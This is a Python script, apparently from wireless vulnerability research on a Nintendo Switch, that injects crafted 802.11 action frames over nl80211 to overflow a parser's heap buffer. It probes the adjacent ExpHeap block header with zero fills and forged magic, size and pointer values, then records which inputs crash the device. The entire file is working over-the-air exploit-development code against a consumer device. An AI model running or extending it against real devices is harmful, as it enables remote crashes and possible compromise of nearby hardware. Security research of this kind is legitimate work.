#!/usr/bin/env python3
"""Systematically probe heap block header fields by varying overflow size.

The body copy writes body_size bytes to parser+0x5C.
Parser is 0x5D8 bytes, so overflow starts at body_size > 0x57C.

nn::lmem::ExpHeap block header (24 bytes):
  +0x00: uint16 magic    ("MU"=0x4D55 or "FR"=0x4652, LE)
  +0x02: uint16 attribute
  +0x04: uint32 blockSize
  +0x08: void*  prev     (8 bytes, pointer)
  +0x10: void*  next     (8 bytes, pointer)

By overflowing exactly N bytes with zeros, we can determine which fields
cause crashes when corrupted.
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412

LP2P_HEADER = (
    b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"
)


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_body(body_size, payload_size=0x100, overflow_data=None):
    """Build type 3 body of exactly body_size bytes.

    overflow_data: if provided, fill the overflow region (body[0x57C:]) with these bytes.
                   If None, fill with zeros.
    """
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, payload_size)
    if overflow_data and body_size > 0x57C:
        overflow_start = 0x57C
        overflow_len = body_size - overflow_start
        fill = overflow_data[:overflow_len]
        body[overflow_start:overflow_start + len(fill)] = fill
    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def run_test(fam_id, ifindex, name, body_size, overflow_data=None, frame_count=100):
    if not check_alive():
        if not wait_alive(30):
            print(f"  SKIP {name}: Switch not available")
            return None

    body = build_body(body_size, 0x100, overflow_data)
    frame = build_frame(body)

    for i in range(frame_count):
        err = send_frame(fam_id, ifindex, frame)
        if err != 0:
            break
        time.sleep(0.002)

    time.sleep(2)
    alive1 = check_alive()
    ping1 = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                            capture_output=True).returncode == 0

    time.sleep(5)
    alive2 = check_alive()
    ping2 = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                            capture_output=True).returncode == 0

    if alive2 and ping2:
        result = "OK"
    elif ping2 and not alive2:
        result = "HTTP_DOWN"
    elif not alive1 and not ping1:
        result = "CRASH_FAST"
    else:
        result = "CRASH_LATE"

    overflow_bytes = max(0, body_size - 0x57C)
    print(f"  {name:45s} body=0x{body_size:04x} overflow={overflow_bytes:3d}B → {result}")
    return {"name": name, "body_size": body_size, "overflow_bytes": overflow_bytes, "result": result}


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")
    print()

    results = []

    # Phase 1: Find exact overflow boundary (zeros fill)
    print("=" * 70)
    print("  PHASE 1: Overflow boundary (zeros fill)")
    print("=" * 70)

    boundary_tests = [
        ("no_overflow", 0x570),     # well below boundary
        ("exact_fit", 0x57C),       # exact parser size (minus header offset)
        ("1_byte", 0x57D),          # 1 byte overflow
        ("2_bytes_magic", 0x57E),   # 2 bytes = magic field
        ("4_bytes_magic+attr", 0x580),  # magic + attribute
        ("8_bytes_+size", 0x584),   # magic + attr + blockSize
        ("16_bytes_+prev", 0x58C),  # + prev pointer
        ("24_bytes_+next", 0x594),  # + next pointer (full header)
        ("32_bytes_header+8", 0x59C),  # header + 8 bytes of data
        ("64_bytes", 0x5BC),        # header + 0x28 bytes
    ]

    for name, bsize in boundary_tests:
        r = run_test(fam_id, ifindex, name, bsize)
        if r:
            results.append(r)
        if r and r["result"] != "OK":
            time.sleep(15)
            wait_alive(30)

    # Phase 2: Test specific magic values at the boundary
    print(f"\n{'='*70}")
    print("  PHASE 2: Magic field values (body_size=0x57E, 2-byte overflow)")
    print("=" * 70)

    magic_tests = [
        ("magic_0000", b"\x00\x00"),
        ("magic_MU",   b"\x55\x4d"),  # "MU" in LE = 0x4D55
        ("magic_FR",   b"\x52\x46"),  # "FR" in LE = 0x4652
        ("magic_DEAD", b"\xad\xde"),
        ("magic_FFFF", b"\xff\xff"),
    ]

    for name, magic_bytes in magic_tests:
        r = run_test(fam_id, ifindex, name, 0x57E, magic_bytes)
        if r:
            results.append(r)
        if r and r["result"] != "OK":
            time.sleep(15)
            wait_alive(30)

    # Phase 3: Test if the adjacent block is FREE or USED
    # Strategy: overflow 2 bytes with FR magic, then 2 bytes with MU magic
    # If one crashes and the other doesn't, it tells us the original state
    print(f"\n{'='*70}")
    print("  PHASE 3: Header preservation tests (24-byte overflow)")
    print("=" * 70)

    # Test: FR header with realistic values
    header_tests = []

    # FR with size 0
    h = bytearray(24)
    struct.pack_into("<H", h, 0, 0x4652)  # FR
    struct.pack_into("<I", h, 4, 0)       # size=0
    header_tests.append(("FR_size0_null", bytes(h)))

    # FR with size 0x100
    h = bytearray(24)
    struct.pack_into("<H", h, 0, 0x4652)
    struct.pack_into("<I", h, 4, 0x100)
    header_tests.append(("FR_size256_null", bytes(h)))

    # FR with size 0x1000
    h = bytearray(24)
    struct.pack_into("<H", h, 0, 0x4652)
    struct.pack_into("<I", h, 4, 0x1000)
    header_tests.append(("FR_size4K_null", bytes(h)))

    # FR with size 0x8000
    h = bytearray(24)
    struct.pack_into("<H", h, 0, 0x4652)
    struct.pack_into("<I", h, 4, 0x8000)
    header_tests.append(("FR_size32K_null", bytes(h)))

    # MU with size 0x100
    h = bytearray(24)
    struct.pack_into("<H", h, 0, 0x4D55)
    struct.pack_into("<I", h, 4, 0x100)
    header_tests.append(("MU_size256_null", bytes(h)))

    # MU with size 0x5D8 (same as parser)
    h = bytearray(24)
    struct.pack_into("<H", h, 0, 0x4D55)
    struct.pack_into("<I", h, 4, 0x5D8)
    header_tests.append(("MU_size5D8_null", bytes(h)))

    for name, hdr in header_tests:
        r = run_test(fam_id, ifindex, name, 0x594, hdr)
        if r:
            results.append(r)
        if r and r["result"] != "OK":
            time.sleep(15)
            wait_alive(30)

    # Summary
    print(f"\n{'='*70}")
    print("  SUMMARY")
    print("=" * 70)
    for r in results:
        print(f"  {r['name']:45s} overflow={r['overflow_bytes']:3d}B → {r['result']}")

    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "heap_boundary_test.json")
    with open(outfile, "w") as f:
        json.dump({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"), "results": results}, f, indent=2)
    print(f"\n  Saved to {outfile}")


if __name__ == "__main__":
    main()
